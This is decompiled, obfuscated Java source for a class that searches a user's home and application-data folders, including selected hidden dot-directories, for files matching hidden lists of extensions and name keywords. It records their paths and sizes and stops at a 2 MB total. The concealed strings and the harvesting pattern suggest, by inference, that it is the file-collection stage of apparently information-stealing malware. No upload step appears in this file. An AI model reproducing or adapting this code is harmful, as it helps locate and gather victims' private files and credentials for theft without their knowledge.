/*
 * Decompiled with CFR 0.152.
 */
package x;

import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

public final class ad {
    private static final Set<String> a = new HashSet<String>(Arrays.asList($S.d(676), $S.d(677), $S.d(678), $S.d(679), $S.d(680), $S.d(681), $S.d(682), $S.d(683), $S.d(684), $S.d(685), $S.d(686), $S.d(687), $S.d(688), $S.d(689), $S.d(690), $S.d(691), $S.d(692), $S.d(693), $S.d(694), $S.d(695), $S.d(696), $S.d(697), $S.d(698), $S.d(699), $S.d(700), $S.d(701), $S.d(702), $S.d(703), $S.d(587), $S.d(446), $S.d(704), $S.d(705), $S.d(706), $S.d(707), $S.d(675), $S.d(708), $S.d(709), $S.d(710), $S.d(711), $S.d(712), $S.d(713), $S.d(714), $S.d(715), $S.d(716), $S.d(717), $S.d(718), $S.d(719), $S.d(720), $S.d(721), $S.d(722), $S.d(586)));
    private static final String[] b = new String[]{$S.d(420), $S.d(723), $S.d(724), $S.d(725), $S.d(421), $S.d(726), $S.d(727), $S.d(728), $S.d(729), $S.d(730), $S.d(731), $S.d(445), $S.d(732), $S.d(733), $S.d(422), $S.d(423), $S.d(734), $S.d(735), $S.d(736), $S.d(737), $S.d(738), $S.d(125), $S.d(739), $S.d(740), $S.d(741), $S.d(742), $S.d(743), $S.d(744), $S.d(745), $S.d(746), $S.d(747), $S.d(748), $S.d(749), $S.d(750), $S.d(751), $S.d(752), $S.d(753), $S.d(754), $S.d(755), $S.d(756), $S.d(757), $S.d(758), $S.d(759), $S.d(760), $S.d(424), $S.d(761), $S.d(762), $S.d(763), $S.d(764), $S.d(765), $S.d(766), $S.d(767), $S.d(135), $S.d(768), $S.d(769), $S.d(770), $S.d(771), $S.d(772), $S.d(773), $S.d(774), $S.d(775), $S.d(776), $S.d(704), $S.d(777), $S.d(778), $S.d(779), $S.d(780), $S.d(781), $S.d(782)};
    private static final Set<String> c = new HashSet<String>(Arrays.asList($S.d(783), $S.d(784), $S.d(785), $S.d(786), $S.d(787), $S.d(788), $S.d(789), $S.d(790), $S.d(791), $S.d(792), $S.d(793), $S.d(794), $S.d(795), $S.d(796)));

    public static List<a> a() {
        int n2;
        int n3;
        String string;
        String[] stringArray;
        File[] fileArray = System.getProperty($S.d(633));
        if (fileArray == null) {
            fileArray = System.getenv($S.d(505));
        }
        if (fileArray == null) {
            fileArray = "";
        }
        if ((stringArray = System.getenv($S.d(212))) == null) {
            stringArray = "";
        }
        if ((string = System.getenv($S.d(211))) == null) {
            string = "";
        }
        ArrayList<a> arrayList = new ArrayList<a>();
        long[] lArray = new long[]{0L};
        String[] stringArray2 = new String[]{(String)fileArray + $S.d(634), (String)fileArray + $S.d(635), (String)fileArray + $S.d(636), (String)fileArray + $S.d(637), (String)fileArray + $S.d(638), (String)fileArray + $S.d(639), (String)fileArray + $S.d(640), (String)fileArray + $S.d(641), (String)stringArray + $S.d(642), (String)stringArray + $S.d(643), (String)stringArray + $S.d(644), (String)stringArray + $S.d(645)};
        Object object = stringArray2;
        object = stringArray2;
        int cfr_ignored_0 = stringArray2.length;
        for (n3 = 0; n3 < 12; ++n3) {
            String string2 = object[n3];
            ad.a(new File(string2), (String)fileArray, arrayList, lArray);
        }
        object = new String[]{(String)fileArray + $S.d(646), (String)fileArray + $S.d(647), (String)fileArray + $S.d(648), (String)fileArray + $S.d(649), (String)fileArray + $S.d(650), (String)fileArray + $S.d(651), (String)fileArray + $S.d(652), (String)fileArray + $S.d(653), (String)fileArray + $S.d(654), (String)fileArray + $S.d(655), (String)fileArray + $S.d(656), (String)stringArray + $S.d(657), (String)stringArray + $S.d(658), (String)stringArray + $S.d(659), string + $S.d(660), (String)stringArray + $S.d(661), (String)stringArray + $S.d(662)};
        stringArray = object;
        int cfr_ignored_1 = ((String[])object).length;
        for (n2 = 0; n2 < 17; ++n2) {
            string = stringArray[n2];
            object = new File(string);
            if (!((File)object).exists()) continue;
            n3 = string.contains($S.d(663)) || string.contains($S.d(664)) || string.contains($S.d(665)) || string.contains($S.d(666)) || string.contains($S.d(667)) || string.contains($S.d(668)) || string.contains($S.d(669)) || string.contains($S.d(670)) || string.contains($S.d(671)) ? 1 : 0;
            ad.a((File)object, 0, n3 != 0 ? 2 : 4, (String)fileArray, arrayList, lArray);
        }
        stringArray = new String[]{$S.d(672), $S.d(673), $S.d(674)};
        int cfr_ignored_2 = stringArray.length;
        block2: for (n2 = 0; n2 < 3; ++n2) {
            File[] fileArray2;
            string = stringArray[n2];
            object = new File(string);
            if (!((File)object).exists() || !((File)object).isDirectory() || (fileArray2 = ((File)object).listFiles()) == null) continue;
            fileArray = fileArray2;
            int n4 = fileArray2.length;
            for (int i2 = 0; i2 < n4; ++i2) {
                File file = fileArray[i2];
                if (lArray[0] >= 0x200000L) continue block2;
                if (!file.isFile() || !ad.a(file.getName().toLowerCase())) continue;
                ad.a(file, string, arrayList, lArray);
            }
        }
        return arrayList;
    }

    private static void a(File fileArray, int n2, int n3, String string, List<a> list2, long[] lArray) {
        if (n2 > n3 || lArray[0] >= 0x200000L) {
            return;
        }
        try {
            fileArray = fileArray.listFiles();
        }
        catch (Exception exception) {
            return;
        }
        if (fileArray == null) {
            return;
        }
        for (File file : fileArray) {
            String string2;
            if (lArray[0] >= 0x200000L) {
                return;
            }
            if (file.isDirectory()) {
                string2 = file.getName().toLowerCase();
                if (string2.startsWith(".") && !string2.equals($S.d(663)) && !string2.equals($S.d(664)) && !string2.equals($S.d(665)) && !string2.equals($S.d(675)) || c.contains(string2)) continue;
                ad.a(file, n2 + 1, n3, string, list2, lArray);
                continue;
            }
            int n4 = file.getName().lastIndexOf(46);
            string2 = n4 >= 0 ? file.getName().substring(n4).toLowerCase() : "";
            String string3 = file.getName().toLowerCase();
            if (!a.contains(string2) && !ad.a(string3)) continue;
            ad.a(file, string, list2, lArray);
        }
    }

    private static boolean a(String string) {
        String[] stringArray = b;
        int n2 = b.length;
        for (int i2 = 0; i2 < n2; ++i2) {
            String string2 = stringArray[i2];
            if (!string.contains(string2)) continue;
            return true;
        }
        return false;
    }

    private static void a(File file, String string, List<a> list2, long[] lArray) {
        if (lArray[0] >= 0x200000L) {
            return;
        }
        try {
            if (!file.exists() || !file.isFile() || file.length() == 0L || file.length() > 524288L) {
                return;
            }
            if (lArray[0] + file.length() > 0x200000L) {
                return;
            }
            a a2 = new a();
            new a().a = file.getAbsolutePath();
            try {
                a2.b = new File(string).toPath().relativize(file.toPath()).toString();
            }
            catch (Exception exception) {
                a2.b = file.getName();
            }
            a2.c = file.length();
            list2.add(a2);
            lArray[0] = lArray[0] + file.length();
            return;
        }
        catch (Exception exception) {
            return;
        }
    }

    public static final class a {
        public String a;
        public String b;
        public long c;
    }
}

